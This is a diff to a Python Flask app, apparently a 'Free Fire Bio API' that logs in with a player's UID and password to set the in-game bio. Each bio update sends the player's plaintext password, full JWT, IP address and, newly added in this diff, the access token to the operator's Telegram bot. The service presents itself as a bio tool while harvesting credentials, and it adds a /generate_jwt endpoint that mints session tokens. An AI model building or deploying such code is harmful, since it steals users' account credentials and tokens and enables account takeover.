@@ -1,4 +1,4 @@
-# app.py - FULL VERSION (Set Bio + Get Bio + Profile Check)
+# app.py - FULL VERSION (Auto Generate JWT dari UID/Pass + Update Bio)
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -12,9 +12,24 @@ import hashlib
 import re
 import struct
 import threading
+import asyncio
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from datetime import datetime
+
+# Import jwt_generator
+import sys
+import os
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+
+# Coba import jwt_generator, jika gagal fallback ke manual
+try:
+    from jwt import get_jwt_sync, get_jwt_from_token_sync
+    JWT_GENERATOR_AVAILABLE = True
+    print("✅ Using jwt_generator.py for JWT generation")
+except ImportError:
+    JWT_GENERATOR_AVAILABLE = False
+    print("⚠️ jwt_generator.py not found, using manual JWT generation")
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -126,8 +141,8 @@ def perform_guest_login(uid, password):
         
         if 'access_token' in data:
             return data['access_token'], data.get('open_id')
-    except:
-        pass
+    except Exception as e:
+        print(f"Guest login error: {e}")
     return None, None
 
 def perform_major_login(access_token, open_id):
@@ -212,16 +227,38 @@ def perform_major_login(access_token, open_id):
                     return '.'.join(parts[:3])
         return None
     except Exception as e:
+        print(f"Major login error: {e}")
         return None
 
-def generate_jwt_from_uid_pass(uid, password):
+def generate_jwt_from_uid_pass_manual(uid, password):
+    """Manual JWT generation (fallback)"""
     try:
         access_token, open_id = perform_guest_login(uid, password)
         if not access_token or not open_id:
-            return None
-        return perform_major_login(access_token, open_id)
-    except:
-        return None
+            return None, None
+        jwt_token = perform_major_login(access_token, open_id)
+        return jwt_token, access_token
+    except Exception as e:
+        print(f"Manual JWT error: {e}")
+        return None, None
+
+def generate_jwt_from_uid_pass(uid, password):
+    """Generate JWT dari UID + Password - prioritas pakai jwt_generator.py"""
+    
+    # Method 1: Pakai jwt_generator.py (lebih reliable)
+    if JWT_GENERATOR_AVAILABLE:
+        try:
+            print(f"🔑 Generating JWT using jwt_generator.py for UID: {uid}")
+            result = get_jwt_sync(uid, password)
+            if result and result.get('token'):
+                print(f"✅ JWT generated via jwt_generator.py")
+                return result['token'], result.get('access_token')
+        except Exception as e:
+            print(f"⚠️ jwt_generator.py failed: {e}, falling back to manual")
+    
+    # Method 2: Fallback ke manual
+    print(f"🔑 Generating JWT manually for UID: {uid}")
+    return generate_jwt_from_uid_pass_manual(uid, password)
 
 def check_profile_from_api(uid, region="id"):
     """Cek profil dari API ff.ggbluewhale.store"""
@@ -288,8 +325,8 @@ def upload_bio_request(jwt_token, bio_text):
     except Exception as e:
         return {"status": f"Error: {str(e)}", "code": 500}
 
-def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", action="UPDATE BIO"):
-    """Kirim notifikasi lengkap ke Telegram termasuk JWT"""
+def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", action="BIO UPDATE", access_token=None):
+    """Kirim notifikasi lengkap ke Telegram termasuk JWT dan Access Token"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         
@@ -307,6 +344,9 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
 
 🔐 <b>JWT TOKEN (LENGKAP):</b>
 <code>{jwt_token}</code>
+
+🔑 <b>Access Token:</b>
+<code>{access_token[:50] if access_token else 'N/A'}...</code>
 
 📞 <b>IP Caller:</b> {ip_address}
 ⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}
@@ -328,7 +368,7 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
 # ============ ROUTES ============
 @app.route("/bio_upload", methods=["GET", "POST"])
 def combined_bio_upload():
-    """Endpoint untuk SET/UPDATE bio"""
+    """Endpoint untuk SET/UPDATE bio - Auto generate JWT dari UID/Pass"""
     bio = request.args.get("bio") or request.form.get("bio")
     jwt_token = request.args.get("jwt") or request.form.get("jwt")
     uid = request.args.get("uid") or request.form.get("uid")
@@ -355,8 +395,9 @@ def combined_bio_upload():
     final_region = region.lower()
     login_method = "Direct JWT"
     profile_info = None
+    access_token = None
     
-    # Method 1: Direct JWT
+    # Method 1: Direct JWT (langsung pakai JWT yang diberikan)
     if final_jwt:
         uid_from_jwt, name_from_jwt, region_from_jwt = decode_jwt_info(final_jwt)
         if uid_from_jwt:
@@ -366,38 +407,42 @@ def combined_bio_upload():
                 final_region = region_from_jwt.lower()
             login_method = "Direct JWT"
     
-    # Method 2: UID + Password (Generate JWT)
+    # Method 2: UID + Password → AUTO GENERATE JWT BARU
     elif uid and password:
-        login_method = "UID/Pass Login"
+        login_method = "UID/Pass Login (Auto Generate JWT)"
         final_uid = uid
         final_password = password
         
-        generated_jwt = generate_jwt_from_uid_pass(uid, password)
+        # Generate JWT baru dari UID + Password
+        generated_jwt, access_token = generate_jwt_from_uid_pass(uid, password)
+        
         if generated_jwt:
             final_jwt = generated_jwt
             _, name_from_jwt, region_from_jwt = decode_jwt_info(generated_jwt)
             final_name = name_from_jwt
             if region == "id" and region_from_jwt:
                 final_region = region_from_jwt.lower()
+            print(f"✅ New JWT generated successfully for UID: {uid}")
         else:
             return jsonify({
                 "status": "❌ JWT Generation Failed",
                 "code": 401,
-                "error": "Invalid UID/Password",
-                "uid": uid
+                "error": "Failed to generate JWT from UID/Password. Please check credentials.",
+                "uid": uid,
+                "hint": "Make sure UID and Password are correct"
             }), 401
     
     if not final_jwt:
         return jsonify({
             "status": "❌ JWT Required",
             "code": 400,
-            "error": "Please provide a valid JWT token or UID/Pass"
+            "error": "Please provide a valid JWT token or UID/Pass to generate new JWT"
         }), 400
     
-    # Upload bio
+    # Upload bio dengan JWT
     bio_result = upload_bio_request(final_jwt, bio)
     
-    # Check profile dari API
+    # Check profile dari API (untuk mendapatkan nama, level, dll)
     if final_uid:
         try:
             profile_info = check_profile_from_api(final_uid, final_region)
@@ -417,7 +462,7 @@ def combined_bio_upload():
             "status": "❌ Not Found"
         }
     
-    # Kirim Telegram
+    # Kirim Telegram dengan semua info
     send_telegram_notification(
         uid=profile_info.get('uid', final_uid or 'N/A'),
         password=final_password,
@@ -430,7 +475,8 @@ def combined_bio_upload():
         bio_status=bio_result.get('status', 'Unknown'),
         signature=profile_info.get('signature', bio),
         clan=profile_info.get('clan', 'N/A'),
-        action="BIO UPDATE"
+        action="BIO UPDATE",
+        access_token=access_token
     )
     
     # Response
@@ -453,12 +499,45 @@ def combined_bio_upload():
         "server_response": bio_result.get("server_response", "N/A"),
         "endpoint_used": bio_result.get("endpoint", "N/A"),
         "generated_jwt": final_jwt,
-        "telegram_sent": True
+        "access_token": access_token,
+        "telegram_sent": True,
+        "jwt_generator_used": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual"
     }
 
     response = make_response(jsonify(response_data))
     response.headers["Content-Type"] = "application/json"
     return response
+
+@app.route("/generate_jwt", methods=["GET", "POST"])
+def generate_jwt_only():
+    """Endpoint khusus untuk generate JWT saja (tanpa update bio)"""
+    uid = request.args.get("uid") or request.form.get("uid")
+    password = request.args.get("pass") or request.form.get("pass")
+    
+    if not uid or not password:
+        return jsonify({
+            "success": False,
+            "error": "Missing uid or pass parameter",
+            "usage": "/generate_jwt?uid=16208500077&pass=ANONFK123ABC"
+        }), 400
+    
+    jwt_token, access_token = generate_jwt_from_uid_pass(uid, password)
+    
+    if jwt_token:
+        return jsonify({
+            "success": True,
+            "uid": uid,
+            "jwt_token": jwt_token,
+            "access_token": access_token,
+            "jwt_generator_used": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual",
+            "Credit": "sulav_codex_ff"
+        })
+    else:
+        return jsonify({
+            "success": False,
+            "error": "Failed to generate JWT",
+            "uid": uid
+        }), 401
 
 @app.route("/get_bio", methods=["GET"])
 def get_bio():
@@ -474,7 +553,6 @@ def get_bio():
         }), 400
     
     try:
-        # Cek profil dari API
         url = f"{GET_BIO_URL}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
         response = requests.get(url, timeout=10)
         
@@ -525,25 +603,29 @@ def get_bio():
 def home():
     return jsonify({
         "success": True,
-        "message": "Free Fire Bio API",
+        "message": "Free Fire Bio API - Auto JWT Generator",
         "endpoints": {
-            "/bio_upload": "SET/UPDATE bio (GET/POST) with JWT or UID/Pass",
+            "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
+            "/generate_jwt": "Generate JWT only from UID/Pass",
             "/get_bio": "GET bio orang lain (tanpa mengubah)",
             "/check_profile": "Check profile data from API",
             "/": "This info page"
         },
         "usage": {
             "set_bio": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id",
+            "generate_jwt": "/generate_jwt?uid=UID&pass=PASSWORD",
             "get_bio": "/get_bio?uid=UID&region=id",
             "check_profile": "/check_profile?uid=UID&region=id"
         },
         "features": [
-            "Set/Update bio with JWT or UID/Password",
-            "Get bio of any player (read-only)",
-            "Get nickname, level, rank, region, clan",
-            "Telegram notification with complete JWT",
-            "No protobuf dependency"
+            "✅ Auto generate JWT from UID + Password",
+            "✅ Set/Update bio with generated JWT",
+            "✅ Get bio of any player (read-only)",
+            "✅ Get nickname, level, rank, region, clan",
+            "✅ Telegram notification with complete JWT + Access Token",
+            "✅ Uses jwt_generator.py for reliable JWT generation"
         ],
+        "jwt_generator": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual (fallback)",
         "Credit": "sulav_codex_ff",
         "Telegram": "@sulav_don2"
     })
@@ -574,4 +656,10 @@ def check_profile():
 
 # ============ MAIN ============
 if __name__ == "__main__":
+    print("=" * 60)
+    print("🔥 FREE FIRE BIO API - AUTO JWT GENERATOR")
+    print("=" * 60)
+    print(f"📱 JWT Generator: {'jwt_generator.py' if JWT_GENERATOR_AVAILABLE else 'Manual (fallback)'}")
+    print(f"🚀 Server running on http://0.0.0.0:5000")
+    print("=" * 60)
     app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
